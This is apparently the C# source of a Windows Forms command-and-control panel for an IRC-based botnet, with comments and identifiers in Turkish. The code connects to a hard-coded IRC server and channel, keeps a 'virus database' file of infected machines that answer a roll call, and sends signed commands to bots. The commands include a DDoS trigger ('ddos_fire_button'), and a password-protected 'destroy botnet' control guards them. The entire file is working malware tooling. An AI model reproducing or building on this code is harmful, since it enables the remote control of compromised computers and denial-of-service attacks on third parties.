using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Meebey.SmartIrc4net;
using System.Net;
using System.IO;
namespace netStrikeAdministrationTool
{

    public partial class Form1 : Form
    {
       
        public  IrcClient Client = new IrcClient();
       

        public string server = "192.99.92.223";
        public string channel = "#Chatterz";
        public int port = 6667;

        public string nick = "Yonetici";
        public string username = "awdh1234";

        public string textdosyasi = "virusveritabani.txt";
       public  bool komut_listesi_aliniyor = false;
       public List<string> user_list;
        public int yoklanan = 0;

        public bool tarihvesaatalindi = false;
        public string imza="";

        public List<client> istemciler = new List<client>();
        bool Silme_izni_alindi = false;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false; // ayaralamalar
            Listener.WorkerSupportsCancellation = true;
            discon.WorkerSupportsCancellation = true;

            //virüs veritabanı dosyası oluşturma.
            //string veritabaniyolu = Environment.CurrentDirectory.ToString() + "\\virusveritabani.txt";
           // File.Create(veritabaniyolu);
        }

      

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            
               
        }

        private void manuel_emir_check_CheckedChanged(object sender, EventArgs e)
        {
            if(manuel_emir_check.Checked == true)
            {
                send_button.Enabled = true;
                console_textbox.Enabled = true;
            }
            else if(manuel_emir_check.Checked == false)
            {
                send_button.Enabled = false;
                console_textbox.Enabled = false;
            }
        }

        private void connect_button_Click(object sender, EventArgs e)
        {
            server = server_textbox.Text;
            channel = channel_textbox.Text;
            if (Client.IsConnected == true)
            {
                
                
                connect_button.Text = "bağlan";
                label4.ForeColor = Color.Red;
                Client.RfcQuit();
                Client.Disconnect();
                Listener.CancelAsync();


            }
            else if(Client.IsConnected == false)
            {
               
                Listener.RunWorkerAsync();
                connect_button.Text = "bağlantıyı kes";
               
            }
        }

        private void AppendOnListBox(string text)
        {
            output_textbox.AppendText(text);
            output_textbox.AppendText(Environment.NewLine);
        }
        private void Client_OnRawMessage(object sender, IrcEventArgs e)
        {
            string message = e.Data.Message;
            if (message != null)
            {

                
                
                if(komut_listesi_aliniyor)
                {
                    AppendOnListBox(e.Data.Message);
                    user_list = FazAyristirici(e.Data.Message);
                    bool bulundu = false;
                    var log = File.ReadAllLines(textdosyasi);
                    List<string> lines = new List<string>(log);
                    user_listview.Items.Clear();
                    foreach (string user in user_list)
                    {
                        foreach (string satir in lines)
                        {
                            if (satir.Contains(user))
                            {
                                ListViewItem item = new ListViewItem(user);
                                item.ForeColor = Color.Magenta;
                                user_listview.Items.Add(item);  
                                bulundu = true;
                            }
                        }
                        if (bulundu == false)
                        {
                           ListViewItem item = new ListViewItem(user);
                                item.ForeColor = Color.Aqua;
                                user_listview.Items.Add(item);  
                        }
                        bulundu = false;
                    }

                    komut_listesi_aliniyor = false;
                }  
                else if (e.Data.Message == "Kontrol_Edildi") 
                {
                    AppendOnListBox(e.Data.Message);
                    MessageBox.Show(e.Data.Nick+" kontrol edildi" );
                    if (!File.ReadAllText(textdosyasi).Contains(e.Data.Nick + " | " + e.Data.Irc.Realname + " | " + e.Data.Irc.Address))
                    {
                        File.AppendAllText(textdosyasi,
                                     e.Data.Nick + " | " + e.Data.Irc.Realname + " | " + e.Data.Irc.Address + Environment.NewLine);
                        yoklanan++;
                        yoklamalabel.Text = "Yoklanan :" + yoklanan.ToString();
                    }
                }
                else if(e.Data.RawMessage.Contains(" 391 "))//İMZALAMA fonk
                {
                    imza = retunrminhour(e.Data.RawMessage);
                    tarihvesaatalindi = true;
                }
                else
                {
                 try
                    { 
                        string text = e.Data.Message;
                        string kova = "";
                        for (int i = 0; i < text.Length; i++)
                        {
                            if (text[i] == '|' & text[i + 1] == '|')
                            {
                                AppendOnListBox(kova);
                                kova = "";
                                i++;
                            }
                            else
                            {
                                kova += text[i];
                            }
                        }

                    }
                    catch { AppendOnListBox(e.Data.Message); }
                }
            }
        }

        static List<string> FazAyristirici(string RawOrder)
        {
            List<string> elemanlar = new List<string>();

            string kova = "";
            for (int i = 0; i < RawOrder.Length; i++)
            {
                if (RawOrder[i] == ' ')
                {
                    elemanlar.Add(kova);
                    kova = "";

                }
                else if (i == RawOrder.Length - 1)
                {
                    kova += RawOrder[RawOrder.Length - 1];
                    elemanlar.Add(kova);

                }
                else if (RawOrder[i] != ' ')
                {
                    kova += RawOrder[i];

                }
            }
            return elemanlar;
        }
        private void Listener_DoWork(object sender, DoWorkEventArgs e)
        {
           // try
           // {
                string[] serverlist;
                serverlist = new string[] { server };
                label4.ForeColor = Color.Yellow;
                label4.Text = "connecting...";
                Client.Connect(serverlist, port);
                Client.Login(nick, username);
                Client.OnRegistered += delegate
                {
                    Client.RfcJoin(channel);
                };
                label4.ForeColor = Color.Lime;
                label4.Text = "connected";
                Client.OnRawMessage += Client_OnRawMessage;
                Client.OnChannelAction += Client_OnChannelAction;
                Client.Listen();
            /*
            }
            catch (Exception exp)
            {
                output_textbox.Text += exp.ToString() + "\n";
                label4.ForeColor = Color.Red;
                label4.Text = "not connected";
                Listener.CancelAsync();
            }
            */
        }

        private void Client_OnChannelAction(object sender, ActionEventArgs e)
        {
            AppendOnListBox(e.Data.Message);
            AppendOnListBox(e.Data.Type.ToString());
        }

        private void liste_refresh_Click(object sender, EventArgs e)
        {
            Client.RfcNames(channel);
            komut_listesi_aliniyor = true;
        }
        private void send_button_Click(object sender, EventArgs e)
        {
            sendMessage(console_textbox.Text);
        }

        private void sendMessage(string text)
        {
          
            Client.SendMessage(SendType.Message, channel, text);
            output_textbox.AppendText("gonderildi :" + text);
            output_textbox.AppendText(Environment.NewLine);
        }

        private void privmsg(string text,string to)
        {
            
            Client.RfcPrivmsg(to, text);
            output_textbox.AppendText("gonderildi :" + text);
            output_textbox.AppendText(Environment.NewLine);
        }
        private void discon_DoWork(object sender, DoWorkEventArgs e)
        {
            connect_button.Text = "connect";
            label4.ForeColor = Color.Red;
            Client.Disconnect();  
        }

        string retunrminhour(string totrim)
        {
         
            string katsayi = "";
         
            for (int i = 0; i < totrim.Length; i++)
            {
                if (totrim[i] == '-')
                {
                    if (totrim[i + 1] == '-')
                        if (totrim[i + 2] == ' ')
                        {
                            for (int j = i + 3; j < i + 8; j++)
                            {
                                string x="";
                                x += totrim[i + 3];
                                x += totrim[i + 4];

                                string y="";
                                y += totrim[i + 6];
                                y += totrim[i + 7];

                                katsayi = ((Convert.ToInt32(x) * Convert.ToInt32(y) * 71) + 5).ToString();
                            }

                        }
                }
            }
            return katsayi;
        }

        private void ddos_fire_button_Click(object sender, EventArgs e)
        {
            if (Client.IsConnected)
            {
                Client.RfcTime();
                Thread x = new Thread(new ThreadStart(emirgonder));
                x.Start();
                // SYS#ALL#komut#imza
            }
        }

        void emirgonder()
        {
            if (tarihvesaatalindi == true)
            {
                Client.SendMessage(SendType.Message, channel, emir_komut_testbox.Text + "#" + emir_alici_textbox.Text + "#" + emir_parametresi_textbox.Text + "#" + imza);
                tarihvesaatalindi = false;
            }
        }
       

        private void channel_textbox_TextChanged(object sender, EventArgs e)
        {

        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (Silme_izni_alindi == false)
            {
                if (destroybotnet_pass_textbox.Text == "sifresifre")
                {
                    Silme_izni_alindi = true;
                    warn_label1.Text = "Giriş izni verildi...";
                    warn_label1.ForeColor = Color.Lime;
                    destroybotnet_pass_button.Text = "Çıkış";
                    destroybotnet_check.Enabled = true;
                    
                }
                else
                {
                    warn_label1.Text = "Şifre yanlış...";
                    warn_label1.ForeColor = Color.Red;
                }
            }
            else if(Silme_izni_alindi == true)
            {
                destroybotnet_pass_button.Text = "Enter";
                Silme_izni_alindi = false;
                destroybotnet_check.Enabled = false;
                DESTROY_BOTNET_BUTTON.Enabled = false;
                destroybotnet_check.Checked = false;
                warn_label1.ForeColor = Color.Yellow;
                warn_label1.Text = "Çıkış yapıldı...";
                destroybotnet_pass_textbox.Text = "";
            }
        }

        private void groupBox5_Enter(object sender, EventArgs e)
        {

        }

        private void label16_Click(object sender, EventArgs e)
        {

        }

        private void groupBox4_Enter(object sender, EventArgs e)
        {

        }

        private void destroybotnet_check_CheckedChanged(object sender, EventArgs e)
        {
            if (destroybotnet_check.Checked == true)
                DESTROY_BOTNET_BUTTON.Enabled = true;
            else if (destroybotnet_check.Checked == false)
                DESTROY_BOTNET_BUTTON.Enabled = false;
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            sendMessage("Kontrol_Edildi#ALL#0#0#0");//genel bir emir fonsiyonu gerekiyor çünkü bu imzasız bir fonksiyon
            yoklanan = 0;
            yoklamalabel.Text = "yoklandı :";
        }

        private void User_Refresher_Tick(object sender, EventArgs e)
        {

        }

        private void User_Refresher_DoWork(object sender, DoWorkEventArgs e)
        {
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            label15.Text = Client.Nickname;
            label15.ForeColor = Color.Gold;
            label18.ForeColor = Color.Gold;
           label18.Text = File.ReadAllLines("virusveritabani.txt").Length.ToString();
        }

        private void label19_Click(object sender, EventArgs e)
        {

        }
    }
}
